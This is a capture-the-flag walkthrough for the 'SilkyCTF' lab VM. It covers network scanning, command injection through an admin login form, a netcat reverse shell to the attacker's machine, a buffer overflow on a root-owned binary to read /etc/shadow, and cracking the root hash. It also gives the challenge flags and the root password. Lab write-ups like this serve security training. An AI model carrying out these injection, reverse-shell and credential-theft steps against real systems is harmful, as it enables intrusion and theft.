# PZY VM (Hard Difficulty)

This directory consists of challenges related to `PZY VM`.

Author: Xiaozhi and Ting Hui

## Silky CTF writeup 
Step 1: Click edit > virtual box editor, candidates should find their NAT network adapters ip address range. On my vmware, its 192.168.11.0.

Step 2: To identify SilkyCTF VM’s ip address, use the nmap -sn 192.168.11.0/24 to view the active ip address. To validate which ip address belongs to the SILKYCTF VM, use the nmap -A <ip address> to view the open ports as well as the operating system of the ip address.
  

Step 3: Based on the nmap scan above, candidates will be able to see that port 80 is open. When entering the webpage 192.168.11.131 into mobzilla firefox, candidates will see this page.
 
To check for any hidden directory in the apache server, use the dirburster command: 
dirb http://192.168.11.131/ .
 
Step 4:When entering http://192.168.11.131/admin.php,
It greets us with a login button , when clicked, it shows a pop-up login page.
 
Page after a wrong credential is entered.
 








Step 5: Let’s test for some command vulnerability. Some attacks that come to mind when attacking a webpage:
•	SQL injection
•	Cross site scripting
•	Local File intrusion (LFI) /command injection
When entering ls into username field and password =passwd,
We get the following:
 
 
It looks like the apache server has a LFI vulnerability, 


Step 6) Using the login form, I used ls command in silky’s home directory to check if there are any hidden clues.
 
 

It shows that there is a file named flag.txt in silky home directory. 








Step 7) Now to get the flag, use the cat command in the login form.
 
 
Flag : d68815f2afbc48a2a717de2f35478600








Step 8) Next, execute a python reverse shell to get a reverse connection. First set up the netcat listener using nc -lvp 4444 on the kali machine.
 
Then create a reverse shell to send a bash shell from the apache server by issuing the command in the login form:
/bin/nc 192.168.11.130 4444 -e /bin/bash
 
Check the kali machine:
 



Step 9) Next add a python command to upgrade the shell into a linux Debian shell.
python -c ‘import pty;pty.spawn(“/bin/bash”)’
 

Step 10) Based on the screenshot in step 6, there was an unusual binary file in silky’s home directory named cat_shadow. By using the ls -alh command in silky’s home directory, it is a file that is owned by root.
 

Step 11) On execution, the file is checking HEX value, which would make it seem vulnerable to buffer overflow vulnerability.
 

Step 12) Create a simple python script to allow an buffer overflow attack. In this script, write 64 bad characters of “A” and then adds the value of “0x496c5962” in little-endian format and provide the result as input to the “cat_shadow” file and allow us to read the “/etc/shadow” file.
The script is as follows and is used like this:
 
Step 12) Copy the hashes into a txt file and use john to decode the password. This would get you the password for root. This may take some time. 
 
Step 13) Once done, john should show that the password for root is greygrey. Now using the su command, log into root and get the flag.
 
Root flag : d1f258a6ec26dffbbdec79f68890a5e8


